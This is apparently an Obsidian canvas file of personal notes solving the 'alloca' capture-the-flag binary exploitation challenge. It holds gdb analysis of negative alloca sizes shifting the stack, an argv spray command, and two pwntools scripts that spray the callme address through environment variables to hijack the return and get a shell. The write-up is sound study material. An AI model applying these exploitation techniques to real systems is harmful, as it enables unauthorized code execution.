{
	"nodes":[
		{"id":"c19ed9bba359566d","type":"text","text":"# hints\n*Let me give you a lesson: \"How to prevent buffer overflow?\"*\n\n```bash\n[*] '/home/alloca/alloca'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\nseems like a buffer overflow (no canary) to redirect execution with PIE","x":-125,"y":-30,"width":665,"height":550,"color":"5"},
		{"id":"3c23dfe4e2d0beb9","type":"text","text":"# analyzing the challenge\nThe program's goal is to show you it's easy to prevent BOFs.\n\nthe program seem fine but the `alloca` is suspected, read [this](https://stackoverflow.com/questions/1018853/why-is-the-use-of-alloca-not-considered-good-practice)\n\nlet's look at `alloca` implementation. if we set a limit (8192) we can cause a `segfault`.\n\n## `alloca`\n* `eax` = ((size+34) // 16) * 16\n* sub `esp`, `eax`\n* `eax` = ((`esp`+15) >> 4 ) << 4\n","x":649,"y":146,"width":731,"height":594},
		{"id":"b57e68a99c0904d2","type":"text","text":"# gdb\n\n```\nb *0x08048769 \nb *0x080485EF \nb *0x08048831 \nsource /usr/share/peda/peda.py\n\n```\n\nsize location `0x0804A048` \ncall me `0x080485AB`  - 134514091","x":-100,"y":680,"width":562,"height":478},
		{"id":"5ab25501c9c719a1","type":"text","text":"# ability - controlled `alloca` size\n\n### allocate a huge stack buff to get to the BSS, and GOT\nthese locations are dynamic relative to the stack, and we **cannot brute force ASLR** because of sleep. Moreover `fgets` will  exit because the only way to get to these small numbers is to subtract (negative sizes)\n\n## use a negative size to *increase* `esp`\nthe idea is to use \n* `check_canary` local variables \n* `*(buff + size) = canary` \n* other functions that use `&size` \nto write values saved inside the canary to the stack.\n\n#### using `check_canary` local variables \nthe problem here is that when we will try to overwrite the unaligned RA \nwe might damage `*(ebp-4)` which points to the location of the unaligned RA + 4.\n#### using `*(buff + size) = canary` \n`*(esp+aligned(x)-x) = canary` x is bigger then the aligned x so we would write to a place below the frame metadata. \nif I could control this to overwrite RA without the program corrupting the `ebp` we win.\n### using `&size`\nthe problem is that other functions overwrite place in memory where `&size` is pushed","x":600,"y":1120,"width":1492,"height":1040,"color":"6"},
		{"id":"0897f114202034ed","type":"text","text":"### res & changed canary\n\n`res = g_canary ^ canary = 0x0804A048`\n`g_canary = 0x080485AB` \n`*(buff+size) = canary = 0x25e3`\ndon't forget that res location on the stack should overwrite `ebp`.  \n\nthis value is not in memory \n`find 0xffff0000, 0xffffdfff, 0x25e3`\n","x":2000,"y":480,"width":560,"height":400,"color":"1"},
		{"id":"d9c0a7f4869ccdd7","type":"text","text":"# researching -52\n* understand the offset\n    it is  -32, `esp = buff = *(ebp-4) = &argc = one place above the RA`\n* understand who's changing `*(ebp-4)`\n    * inside the next `puts` `push edi` overwrites it\n    * inside `fgets` trying to resolve the location\n    * inside `fgets` `push edi`\n    * `putchar` resolve and `push edi` which is `(_rtld_global_ro)` \n* see the return of main\n    below `(_rtld_global_ro)`  the `(_dl_argc)` value, and we return to the value of it.\n    * the cool thing is that the RA itself didn't get corrupted. Even though it is part of the new stack. I think it's because the `sub` prefix of function calls.\n    * we know we save at least 4 bytes on the stack using these function wrappers.","x":-1116,"y":-100,"width":740,"height":965},
		{"id":"a252d2f739cd94f3","type":"text","text":"# implementing\nwritten a python program that passes a long argv. But argv is too large, moreover we don't have this value with `glibc` remotely","x":-1036,"y":920,"width":580,"height":200},
		{"id":"48168168683571b2","type":"text","text":"# remotely research\nthere is a big difference between remote and local execution because of the `glibc` version.\n\noverlay layout\n![[Pasted image 20231201153725.png]]\n\nchecking the option of -64, other functions corrupt `&argc` which fucks everything. ","x":-8,"y":2800,"width":830,"height":1340,"color":"5"},
		{"id":"65944ac70d17a18a","type":"text","text":"# ability\nI can change `esp` to `canary_before` and immediately `ret`.\n\nlocation that will not crash\n* stack\n* bss (size, `g_canary`, buffer) \n* got (`fgets`, `system`, `scanf`)\n","x":27,"y":4320,"width":759,"height":360,"color":"4"},
		{"id":"a7dcc5fbea865aa3","type":"text","text":"# overwriting RA with `check_canary` locals\nafter playing with the stack I found that  `glibc` functions use a lot of the stack... and they corrupt `*(ebp-4)`\n","x":-880,"y":1528,"width":1240,"height":225,"color":"2"},
		{"id":"aa4be70b977555d4","type":"text","text":"# plan\n\n1. write notes for improving workflow\n2. research the `argc` vuln with -52 \n * I want to see how `*(ebp-4)` changes\n * I want to understand what is changing it\n     * which function? `awatch $ebp`\n3. understand remote offsets and watch the RA and `ebp-4`\n2. read previous challenges \n","x":-1118,"y":2040,"width":736,"height":560,"color":"3"},
		{"id":"c77485cfd03da441","type":"text","text":"# improving workflow\n* organize your thoughts by writing clearly and organizing the notes\n* write the target of analyzing before going to analyze. make a plan.\n* understand what you are using.","x":-2080,"y":2176,"width":840,"height":288,"color":"3"},
		{"id":"985afbe36515fd4d","type":"text","text":"# research directions\n* understand the layout and how the offset relates to the frame stack of `check_canary`\n* search inside the writable memory of the process a location that has the value of `callme`  (no value found)\n* try to ROP chain to `callme` using the writable memory as a stack. And a starting address that will be at the stack. (it's harder then it looks)\n* use `scanf(&size)` to overwrite `ebp`... most likely wouldn't work, but maybe it is possible. The idea here is to change ebp-4 to &size then when loading `ecx-4` it will be the location of `g_canary` which will hold `callme` location. not possible we have the an exact `scanf` call for `g_canary` after it. wait maybe??\n","x":-1160,"y":3000,"width":820,"height":580},
		{"id":"88704b6de8d8a5f3","type":"text","text":"# brute forcing `aslr` to jump to `callme`\n\nthe idea is to overwrite using -80 (`esp+=48`) then inside the canary we will put a stack address. Then passing the program the largest `argv` I can with `callme` location spammed.","x":-111,"y":4800,"width":1111,"height":240,"color":"4"},
		{"id":"6f94ca0854b10902","type":"text","text":"# implementing\n### `gdb`\n1. find where the location of argv `callme` \n2. set canary to it's location + 4 (`-4669984 = 0xffb8bddc+4`)\n3. run with -80. (`gdb --args ./alloca $'\\xab\\x85\\x04\\x08'`)\nworked :) now to the brute force.\n\n### building the script\nI changed the stack limit to unlimited and found that the MAX_ARG_STRLEN is 131072 with `cat /usr/include/linux/binfmts.h | grep MAX_ARG_STRLEN`. I checked and I can only use 131071 per parameter. but I can create `getconf ARG_MAX -> 4611686018427387903` the problem is that python crashes with memory error... I need \n\n```\n./alloca `python2 -c \"print(' '.join(['\\xab\\x85\\x04\\x08'*(131072/4-1)]*10))\"`\n-80\n-4669984\n```\nno brute force was needed :) for some weird reason I can't get out of the shell :)","x":-40,"y":5214,"width":1520,"height":786,"color":"4"},
		{"id":"bcb98ba3a65ebd0e","x":-40,"y":6100,"width":987,"height":1380,"type":"text","text":"# `strawhat`\n\n```python\nfrom pwn import *\n\nspray = p32(0x80485ab)*30000\nenv = {str(a):spray for a in range(12)}\nwhile True:\n    p = process('/home/alloca/alloca',env=env)\n    p.sendline(str(-72))\n    # p.recvuntil(b'give me your random canary number to prove there is no BOF')\n    p.sendline(str(-4759552))\n    p.sendline(b\"ls\")\n    p.interactive()\n\n```\n\nI could use `env` to spray `callme`. Moreover I could just continue to open new processes\n### `D4m0n`\n\n```python\nfrom pwn import *\n\n\nelf = ELF('/home/alloca/alloca')\n\nwin = p32(elf.sym['callme'])\nENV = {str(x): win*30000 for x in range(10)}\n\n\nwhile True:\n    p = process(elf.path, env=ENV)\n    p.sendline('-82')\n    p.sendline('-4849664')\n    p.interactive()\n```\nand I could use `elf.sym`\n\nand I could use `str(numpy.int32(0xffb45000))` to convert to a sign integer...."}
	],
	"edges":[
		{"id":"e89abbbcc6ea575e","fromNode":"3c23dfe4e2d0beb9","fromSide":"bottom","toNode":"5ab25501c9c719a1","toSide":"top"},
		{"id":"96f8133835a65dff","fromNode":"3c23dfe4e2d0beb9","fromSide":"right","toNode":"0897f114202034ed","toSide":"left"},
		{"id":"3427e94b257cfb4b","fromNode":"5ab25501c9c719a1","fromSide":"left","toNode":"a7dcc5fbea865aa3","toSide":"right"},
		{"id":"a5b0fe00e67ffb71","fromNode":"d9c0a7f4869ccdd7","fromSide":"bottom","toNode":"a252d2f739cd94f3","toSide":"top"},
		{"id":"bbaec99c09a192fd","fromNode":"48168168683571b2","fromSide":"bottom","toNode":"65944ac70d17a18a","toSide":"top"},
		{"id":"ab81804941c1f650","fromNode":"aa4be70b977555d4","fromSide":"bottom","toNode":"985afbe36515fd4d","toSide":"top"},
		{"id":"104a15ad14716a7d","fromNode":"5ab25501c9c719a1","fromSide":"bottom","toNode":"48168168683571b2","toSide":"top"},
		{"id":"936900154e93e4a2","fromNode":"65944ac70d17a18a","fromSide":"bottom","toNode":"88704b6de8d8a5f3","toSide":"top"},
		{"id":"873694180df70e08","fromNode":"88704b6de8d8a5f3","fromSide":"bottom","toNode":"6f94ca0854b10902","toSide":"top"}
	]
}